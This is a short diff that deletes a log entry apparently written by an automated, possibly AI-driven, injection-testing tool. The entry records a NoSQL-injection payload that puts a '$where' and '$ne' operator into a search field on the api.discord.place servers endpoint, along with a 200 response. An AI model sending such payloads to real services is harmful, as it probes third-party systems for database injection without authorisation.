@@ -1,7 +1,0 @@
-
-
-          api.discord.place - Log
-            Payload: https://api.discord.place/servers/search{"12":{"field":"{\"$where\":{\"a\":{\"a\":\"$ne:1\"}}}"}}
-            Description: AI generated payload for field 
-            Response: 200
-        
